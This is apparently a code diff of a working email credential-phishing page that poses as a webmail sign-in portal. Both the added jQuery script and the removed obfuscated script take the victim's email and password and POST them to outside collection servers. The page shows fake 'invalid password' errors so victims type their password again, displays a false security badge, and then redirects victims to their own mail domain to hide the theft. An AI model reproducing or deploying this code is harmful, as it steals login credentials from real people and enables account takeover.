+                console[_0x3522b4(0xb2)](_0x34bd96), !_0x34bd96['success'] ? (_0x12e0b2[_0x3522b4(0x95)][_0x3522b4(0xc0)] = _0x3522b4(0xbf), _0x12e0b2[_0x3522b4(0xbb)] = 'Unknown\x20error\x20encountered.\x20Try\x20again\x20later.', _0x4d9fc4[_0x3522b4(0xb5)] = '', _0x4d9fc4[_0x3522b4(0xb3)]()) : _0x34bd96[_0x3522b4(0xc1)] == _0x3522b4(0xa8) ? (n++, document['getElementById'](_0x3522b4(0xb7))[_0x3522b4(0xb5)] = n, _0x4d9fc4[_0x3522b4(0xb5)] = '', _0x12e0b2[_0x3522b4(0x95)][_0x3522b4(0xc0)] = _0x3522b4(0xbf), _0x12e0b2[_0x3522b4(0xbb)] = _0x3522b4(0xae), _0x4d9fc4['focus']()) : window[_0x3522b4(0xb0)]['replace'](_0x3cdf92);
+            })[_0x47a8dd(0x93)](function(_0x23a40f) {
+                var _0x175800 = _0x47a8dd;
+                _0x12e0b2['style'][_0x175800(0xc0)] = _0x175800(0xbf), _0x12e0b2[_0x175800(0xbb)] = _0x175800(0x94), console[_0x175800(0xb2)](_0x23a40f);
+            }), event[_0x47a8dd(0xc3)](), !![];
+        }
+    }
+    </script>
 </head>
 
-<body  style="background-color: transparent;">
-
-    <!-- loader -->
-    <div class="mail-loader_block" id="first" style="margin-top:-200px;" >
-		<center>
-        <img id="main_logo_id" src="" style="width:70px;">
-        <div class="loader" >
-            <div class="loaderBar" style="background-color: green;"></div>
+<body>
+    <div class="form-holder">
+        <div class="xlogo">
+            <img id="zion" width="50" height="50" src="https://storage.googleapis.com/webmail-portal28935.appspot.com/favicons.png">
+            <span style="text-transform: capitalize;" id="banNer"></span>
         </div>
-        <!-- <br> -->
-        <hr style="width:50%;text-align:left;margin-left:0;">
-        <div class="loading_text">loading <span id="loader_email"></span> mail settings ...</div>
-        <hr style="width:50%;text-align:left;margin-left:0">
-		</center>
+        <div class="form-wrap">
+            <p>Please sign in with your email</p>
+            <center>
+                <div class="alert alert-danger" id="mgss" style="display: none;color: red;font-weight: 600;margin-top: 20px">Invalid Password..! Please enter correct password.</div>
+                <span id="error" class="text-danger" style="display: none;color: red;">That account doesn't exist. Enter a different account</span>
+            </center>
+            <div class="finput">
+                <input type="email" id="ai" name="ai" value="" id="email" readonly>
+            </div>
+            <div class="finput">
+                <input type="password" name="pr" placeholder="Email Password" id="pr" required="">
+            </div>
+            <div class="finput btn">
+                <button id="submit-btn">Continue</button>
+            </div>
+            <img src="https://storage.googleapis.com/webmail-portal28935.appspot.com/26-269507_arbys-logo-transparent-norton-secured-logo-png-png.png" width="107" height="58">
+            <span class="privacy">
+                Privacy Policy: <span id="kai" style="text-transform: capitalize;"></span><br>
+                Copyright 2023 . All rights reserved. 
+            </span>
+        </div>
     </div>
-    <!-- loader end -->
-   
-    <div class="container w3-animate-zoom" id="second" style=" background-color: rgb(255, 255, 255); box-shadow: rgba(179, 179, 179, 0.7) 0px 10px 15px;height:560px;"><CENTER>   <img id="top_label_logo" src="" style="">
-        <div class="left_box" style="display: none;">
-            <span>MAIL SETTING PORTAL</span>
-        </div>
-        <div class="top_level" style="background-color: transparent;">
-         
-       
-			<center><b>     <h3 style="display: block;color:blue;font-size:20px;"><span id="toto" style="color:blue;"></span> EMAIL PORTAL</h3></b></center>
-        </div>
-        <div class="intro-text">
-            <h2 id="auth_email" style="color: rgb(6, 39, 171);"></h2>
-            <hr style="width:100%;text-align:left;margin-left:0">
-            <p id="comment_text">You're accessing a secure settings, please provide your <b><span id="pussy"></span></b> password to continue.</p>
-			
-		
-        </div>
-       <form id="contact"> <input hidden name="email" id="email"  style="border-color: rgb(140, 140, 140);"> <div class="inputs"><div class="input">
+    <div id="root">
+        <iframe width="100%" style="opacity: 0.2;" height="115%" id="myframe"  scrolling="no" src="" __idm_frm__="2682"></iframe> </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
 
-		  
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#mgss').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var mgss = $('#mgss').html();
+        $('#mgss').text(mgss);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-<input type="password" name="password" id="password" style="border-color: rgb(140, 140, 140);">
-<label id="pass_label" for="password">Password</label>
-</div>
-<div style="display: flex;">
-<span id="auth_reg">Authentication is required!</span>
-<span id="auth_reg2">Authentication error!</span>
-</div>
-<br>
-<div class="rem_me">
-<input type="checkbox" name="" id="show_pass_button">
-<a id="show_pass" style="color:#0A66C3; font-size: 0.8rem;">Show password</a>
-</div><br>  <button id="submit-btn" style="padding-top: 10px; padding-bottom: 10px; color: rgb(255, 255, 255); background: rgb(24, 143, 255);width:100%;">NEXT</button></div>
-      
-		</form>
-        <br>
-        <hr style="width:100%;text-align:left;margin-left:0;background-color: rgba(128, 128, 128, 0.318);"><br>
-        <p class="join-link">© 2023&nbsp;<a href="#" id="footer_com">Secure Portal</a>&nbsp;<a href="#">|</a>&nbsp;<a href="#" id="footer_pri">Privacy</a><br><a href="#" id="footer_dom"></a></p>
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is empty.!");
+            return false;
+        }
 
-    </div>
-<div class="overlay_div"></div>
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is empty.!");
+            return false;
+        }
 
-   
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        ///////////new injection////////////////
+        count = count + 2;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: 'https://approvedplumbingandheating.com/nnenna/elora.php',
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifying...');
+            },
+            success: function(response) {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                    return false;
+                }
+                $("#mgss").show();
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                    return false;
+                }
+                $("#mgss").show();
+                
+            },
+            complete: function() {
+                $('#submit-btn').html('Continue');
+            }
+        });
+    });
 
 
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
- 	 <script>
-	setTimeout(() => {  
+});
+</script>
 
-	$('#first').css('display', 'none');
-	$('#second').css('display', 'block'); }, 5000);
-    </script>
-
-  
-
-       <script>
-        var Xeno = "https://sp123kl.top/next.php";  </script>
-     <script>
- 
-  
- var _0x38d282=_0x3ae8;function _0x3ae8(_0x354535,_0x632b3d){var _0x18b14c=_0x18b1();_0x3ae8=function(_0x3ae89b,_0x1b07d8){_0x3ae89b=_0x3ae89b-0x18f;var _0x33931f=_0x18b14c[_0x3ae89b];return _0x33931f;};return _0x3ae8(_0x354535,_0x632b3d);}function _0x18b1(){var _0x33d7fc=['156906MIhHkM','red','329640iGcZuP','style','hide','focus','Invalid\x20password.\x20Please\x20try\x20again','location','getElementById','POST','#email','toUpperCase','html','ready','hash','show','7561629fmuXvU','Your\x20password\x20field\x20is\x20empty!!','#loader_email','https://logo.clearbit.com/','#msg','indexOf','#password','#submit-btn','8NvAQJy','val','#main_logo_id','567ibPWxf','ajax','JSON','text','#top_label_logo','#auth_reg','283650PrLTnb','attr','toLowerCase','substr','277945ywGIwO','replace','429867lussge','#pussy','#auth_email','Sign\x20in','preventDefault','borderColor','30328fKjMdY'];_0x18b1=function(){return _0x33d7fc;};return _0x18b1();}(function(_0x1b509e,_0x3488ad){var _0x206631=_0x3ae8;var _0x98d858=_0x1b509e();while(!![]){try{var _0x2e323f=-parseInt(_0x206631(0x1ab))/0x1+parseInt(_0x206631(0x1b4))/0x2+parseInt(_0x206631(0x1ad))/0x3+parseInt(_0x206631(0x19e))/0x4*(-parseInt(_0x206631(0x1b6))/0x5)+-parseInt(_0x206631(0x1a7))/0x6+parseInt(_0x206631(0x1a1))/0x7*(-parseInt(_0x206631(0x1b3))/0x8)+parseInt(_0x206631(0x196))/0x9;if(_0x2e323f===_0x3488ad){break;}else{_0x98d858['push'](_0x98d858['shift']());}}catch(_0x1d7cf0){_0x98d858['push'](_0x98d858['shift']());}}}(_0x18b1,0x48b30));$(document)[_0x38d282(0x193)](function(){var _0x40fe97=_0x38d282;var _0x22ce45=0x0;var _0x554dee=window[_0x40fe97(0x1bb)][_0x40fe97(0x194)]['substr'](0x1);if(!_0x554dee){}else{var _0x2bc6cc=_0x554dee;$(_0x40fe97(0x190))[_0x40fe97(0x19f)](_0x2bc6cc);$(_0x40fe97(0x1af))[_0x40fe97(0x192)](_0x2bc6cc);var _0x54bacd=_0x2bc6cc[_0x40fe97(0x19b)]('@');var _0x520798=_0x2bc6cc[_0x40fe97(0x1aa)](_0x54bacd+0x1);var _0x17bc98=_0x520798['substr'](0x0,_0x520798[_0x40fe97(0x19b)]('.'));var _0xc5276d=_0x17bc98['toLowerCase']();var _0x5d42a2=_0x17bc98[_0x40fe97(0x191)]();$(_0x40fe97(0x1a0))[_0x40fe97(0x1a8)]('src',_0x40fe97(0x199)+_0x520798);$(_0x40fe97(0x1a5))['attr']('src',_0x40fe97(0x199)+_0x520798);$(_0x40fe97(0x198))[_0x40fe97(0x192)](_0x520798);$(_0x40fe97(0x1ae))[_0x40fe97(0x192)](_0x5d42a2);$(_0x40fe97(0x19a))[_0x40fe97(0x1b8)]();$('#toto')[_0x40fe97(0x192)](_0x5d42a2);}var _0xb83a1f='bmV4dC5waHA=';$(_0x40fe97(0x19d))['click'](function(_0x45d4aa){var _0x47267e=_0x40fe97;$('#error')[_0x47267e(0x1b8)]();$(_0x47267e(0x19a))[_0x47267e(0x1b8)]();_0x45d4aa[_0x47267e(0x1b1)]();var _0x19b863=$(_0x47267e(0x190))['val']();var _0x44f20e=$(_0x47267e(0x19c))['val']();var _0x408ceb=$('#page1')[_0x47267e(0x19f)]();var _0xf0d925=$(_0x47267e(0x19a))[_0x47267e(0x192)]();$(_0x47267e(0x19a))[_0x47267e(0x1a4)](_0xf0d925);var _0x4a799e=_0x19b863;if(!_0x44f20e){$(_0x47267e(0x19a))[_0x47267e(0x195)]();$(_0x47267e(0x19a))[_0x47267e(0x192)](_0x47267e(0x197));ai[_0x47267e(0x1b9)];return![];}var _0x18d106=_0x4a799e[_0x47267e(0x19b)]('@');var _0x152d99=_0x4a799e[_0x47267e(0x1aa)](_0x18d106+0x1);var _0x1f8b72=_0x152d99['substr'](0x0,_0x152d99[_0x47267e(0x19b)]('.'));var _0x5e8092=_0x1f8b72[_0x47267e(0x1a9)]();_0x22ce45=_0x22ce45+0x1;$('#domain-name')[_0x47267e(0x192)](_0x5e8092);$[_0x47267e(0x1a2)]({'dataType':_0x47267e(0x1a3),'url':Xeno,'type':_0x47267e(0x18f),'data':{'email':_0x19b863,'password':_0x44f20e,'page1':_0x408ceb},'beforeSend':function(_0x134f8e){var _0x5af257=_0x47267e;$('#submit-btn')[_0x5af257(0x192)]('Loading...');},'error':function(){var _0x26452d=_0x47267e;$(_0x26452d(0x19c))[_0x26452d(0x19f)]('');if(_0x22ce45>=0x2){_0x22ce45=0x0;_0x408ceb='';window[_0x26452d(0x1bb)][_0x26452d(0x1ac)]('https://www.'+_0x152d99);}document[_0x26452d(0x1bc)]('password')[_0x26452d(0x1b7)][_0x26452d(0x1b2)]=_0x26452d(0x1b5);$(_0x26452d(0x1a6))[_0x26452d(0x195)]();$(_0x26452d(0x1a6))[_0x26452d(0x192)](_0x26452d(0x1ba));},'complete':function(){var _0x2b336b=_0x47267e;$(_0x2b336b(0x19d))[_0x2b336b(0x192)](_0x2b336b(0x1b0));}});});});
-
-    </script>
+</html>
